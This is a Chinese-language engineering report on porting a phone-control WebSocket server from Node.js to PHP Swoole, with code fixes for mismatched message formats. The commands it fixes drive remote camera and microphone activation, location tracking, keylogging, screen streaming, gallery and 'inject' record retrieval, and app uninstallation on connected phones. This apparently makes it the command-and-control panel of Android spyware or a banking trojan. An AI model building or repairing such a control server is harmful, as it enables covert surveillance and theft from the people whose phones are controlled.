# PHP Swoole vs Node.js WebSocket 兼容性分析报告

本报告详细对比 `legacy/src/api/ws/websocket-server.js` (Node.js) 和 PHP Swoole WebSocket 服务器的代码，找出所有数据结构和逻辑不一致的问题。

## 问题摘要

| 序号 | 命令 | 问题类型 | 严重程度 | 状态 |
|------|------|----------|----------|------|
| 1 | Camera (cam) | 字段名 & subc 不一致 | 🔴 严重 | ✅ 已修复 |
| 2 | Camera Off (camoff) | subc 不一致 | 🔴 严重 | ✅ 已修复 |
| 3 | Microphone (mic/micoff) | type 和 subc 不一致 | 🔴 严重 | ✅ 已修复 |
| 4 | Location (loc/locoff) | subc 不一致 | 🔴 严重 | ✅ 已修复 |
| 5 | OpenApp | 字段名不一致 | 🟡 中等 | ✅ 已修复 |
| 6 | UninstallApp | 字段名不一致 | 🟡 中等 | ✅ 已修复 |
| 7 | Rename | subc 和字段名不一致 | 🔴 严重 | ✅ 已修复 |
| 8 | ActivityRecords | 前端参数映射问题 | 🟡 中等 | ⚠️ 待验证 |
| 9 | getinject | 未实现 | 🟡 中等 | ✅ 已修复 |
| 10 | getgallery | 未实现 | 🟡 中等 | ✅ 已修复 |
| 11 | Touch/Swipe | 已在 PanelHandler 实现 | 🟡 中等 | ✅ 已实现 |
| 12 | Navigation | 已在 PanelHandler 实现 | 🟡 中等 | ✅ 已实现 |
| 13 | Screen (投屏) | comdtype 不一致 | 🔴 严重 | ✅ 已修复 (之前) |
| 14 | Keylog (键盘监听) | comdtype 不一致 | 🔴 严重 | ✅ 已修复 (之前) |

---

## 详细问题列表

### 🔴 问题 1: Camera (cam) - 字段名 & subc 不一致

**Node.js 实现:**
```javascript
case "cam":
  {
    const jsonData = {
      type: "screencomd",
      subc: "Camera",        // ← 大写 Camera
      SelectedCam: data.SelectedCam,
    };
    MobReciver.send(JSONIT(jsonData));
  }
```

**PHP 当前实现:**
```php
private function handleCamera(string $phoneId, array $data): void
{
    $subc = $data['subc'];
    $deviceData = ['type' => 'screencomd', 'subc' => $subc];  // ← 使用原始 'cam'

    if ($subc === 'cam' && isset($data['SelectedCam'])) {
        $deviceData['SelectedCam'] = $data['SelectedCam'];
    }
    // ...
}
```

**问题:** PHP 发送 `subc: "cam"`, Node.js 发送 `subc: "Camera"`

**修复方案:**
```php
private function handleCamera(string $phoneId, array $data): void
{
    $subc = $data['subc'];
    
    if ($subc === 'cam') {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Camera',  // 改为大写
            'SelectedCam' => $data['SelectedCam'] ?? '',
        ]);
    } elseif ($subc === 'camoff') {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'CameraOff',  // 改为 CameraOff
        ]);
    }
}
```

---

### 🔴 问题 2: Camera Off (camoff) - subc 不一致

**Node.js 实现:**
```javascript
case "camoff":
  {
    const jsonData = {
      type: "screencomd",
      subc: "CameraOff",  // ← CameraOff
    };
    MobReciver.send(JSONIT(jsonData));
  }
```

**PHP 当前实现:** 发送 `subc: "camoff"` (小写)

---

### 🔴 问题 3: Microphone (mic/micoff) - type 和 subc 完全不一致

**Node.js 实现:**
```javascript
case "mic":
  {
    const jsonData = {
      type: "mic",      // ← type 是 "mic"
      subc: "ON",       // ← subc 是 "ON"
    };
    MobReciver.send(JSONIT(jsonData));
  }
  break;
case "micoff":
  {
    const jsonData = {
      type: "mic",      // ← type 是 "mic"
      subc: "OFF",      // ← subc 是 "OFF"
    };
    MobReciver.send(JSONIT(jsonData));
  }
```

**PHP 当前实现:**
```php
private function handleMicrophone(string $phoneId, array $data): void
{
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',  // ← 错误: 应该是 "mic"
        'subc' => $data['subc'], // ← 错误: 发送 "mic" 或 "micoff"
    ]);
}
```

**修复方案:**
```php
private function handleMicrophone(string $phoneId, array $data): void
{
    $subc = $data['subc'];
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'mic',
        'subc' => $subc === 'mic' ? 'ON' : 'OFF',
    ]);
}
```

---

### 🔴 问题 4: Location (loc/locoff) - subc 不一致

**Node.js 实现:**
```javascript
case "loc":
  {
    const jsonData = {
      type: "screencomd",
      subc: "Location",      // ← "Location" 大写
    };
    MobReciver.send(JSONIT(jsonData));
  }
  break;
case "locoff":
  {
    const jsonData = {
      type: "screencomd",
      subc: "Locationoff",   // ← "Locationoff"
    };
    MobReciver.send(JSONIT(jsonData));
  }
```

**PHP 当前实现:** 发送 `subc: "loc"` 或 `subc: "locoff"` (小写)

**修复方案:**
```php
private function handleLocation(string $phoneId, array $data): void
{
    $subc = $data['subc'];
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => $subc === 'loc' ? 'Location' : 'Locationoff',
    ]);
}
```

---

### 🟡 问题 5: OpenApp - 字段名不一致

**Node.js 实现:**
```javascript
case "OPENAPP":
  {
    const jsonData = {
      type: "screencomd",
      subc: "OPENAPP",
      package: data.packageName,  // ← 字段名是 "package"
    };
    MobReciver.send(JSONIT(jsonData));
  }
```

**PHP 当前实现:**
```php
private function handleOpenApp(string $phoneId, array $data): void
{
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => 'OPENAPP',
        'packageName' => $data['packageName'] ?? '',  // ← 字段名是 "packageName"
    ]);
}
```

**修复方案:** 将 `packageName` 改为 `package`

---

### 🟡 问题 6: UninstallApp - 字段名不一致

**Node.js 实现:**
```javascript
case "UNINSTALLAPP":
  {
    const jsonData = {
      type: "screencomd",
      subc: "UNINSTALLAPP",
      package: data.packageName,  // ← 字段名是 "package"
    };
    MobReciver.send(JSONIT(jsonData));
  }
```

**PHP 当前实现:** 使用 `packageName` 字段

**修复方案:** 将 `packageName` 改为 `package`

---

### 🔴 问题 7: Rename - subc 和字段名不一致

**Node.js 实现:**
```javascript
case "rename":
  {
    const jsonData = {
      type: "screencomd",
      subc: "Rename",      // ← 大写 "Rename"
      name: data.nam,      // ← 字段名是 "name"
    };
    MobReciver.send(JSONIT(jsonData));
  }
```

**PHP 当前实现:**
```php
private function handleRename(string $phoneId, array $data): void
{
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => 'rename',    // ← 小写 "rename"
        'nam' => $data['nam'] ?? '',  // ← 字段名是 "nam"
    ]);
}
```

**修复方案:**
```php
private function handleRename(string $phoneId, array $data): void
{
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => 'Rename',       // 改为大写
        'name' => $data['nam'] ?? '',  // 改为 "name"
    ]);
}
```

---

### 🟡 问题 8: ActivityRecords - 参数映射问题

**Node.js 实现:** 使用 `data.subc` 来判断 L 或 D

```javascript
case "activz":
  {
    const subc = data.subc; // 'L' or 'D' - 来自前端的 subc 字段
    const kdate = data.kdate;
    
    if (subc === "L") {
      jsonData = { type: "Activitys", subc: "GA", kdate: kdate };
    } else if (subc === "D") {
      jsonData = { type: "Activitys", subc: "DA", kdate: kdate };
    }
  }
```

**PHP 当前实现:** 使用 `$data['action']` (需要验证前端是否发送此字段)

```php
$action = $data['action'] ?? 'L';  // 使用 action 字段
```

**潜在问题:** 如果前端发送的是 `subc: "L"` 而不是 `action: "L"`，则需要调整

---

### 🟡 问题 9-12: 缺失的命令处理

以下命令在 Node.js 中存在但可能在 PHP 中未正确实现或缺失：

1. **getinject** - 获取注入记录
2. **getgallery** - 获取相册
3. **Touch/Swipe 控制命令** - 触摸操作
4. **Navigation 命令** (home, back, recent)

---

## 修复代码

请将以下修复应用到 `PanelSendHandler.php`:

```php
// 问题 1 & 2: Camera
private function handleCamera(string $phoneId, array $data): void
{
    $subc = $data['subc'];
    
    if ($subc === 'cam') {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'Camera',
            'SelectedCam' => $data['SelectedCam'] ?? '',
        ]);
    } else {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'CameraOff',
        ]);
    }
}

// 问题 3: Microphone
private function handleMicrophone(string $phoneId, array $data): void
{
    $subc = $data['subc'];
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'mic',
        'subc' => $subc === 'mic' ? 'ON' : 'OFF',
    ]);
}

// 问题 4: Location
private function handleLocation(string $phoneId, array $data): void
{
    $subc = $data['subc'];
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => $subc === 'loc' ? 'Location' : 'Locationoff',
    ]);
}

// 问题 5: OpenApp
private function handleOpenApp(string $phoneId, array $data): void
{
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => 'OPENAPP',
        'package' => $data['packageName'] ?? '',
    ]);
}

// 问题 6: UninstallApp
private function handleUninstallApp(string $phoneId, array $data): void
{
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => 'UNINSTALLAPP',
        'package' => $data['packageName'] ?? '',
    ]);
}

// 问题 7: Rename
private function handleRename(string $phoneId, array $data): void
{
    $this->connectionManager->sendToDevice($phoneId, [
        'type' => 'screencomd',
        'subc' => 'Rename',
        'name' => $data['nam'] ?? '',
    ]);
}
```

---

## 待确认问题

1. **前端 ActivityRecords 参数**: 需确认前端发送的是 `subc: "L"` 还是 `action: "L"`
2. **forwardToDevice 默认处理**: 检查默认转发是否会导致未知命令处理异常
3. **getinject/getgallery**: 需添加专门的处理方法

---

*报告生成时间: 2026-02-01*
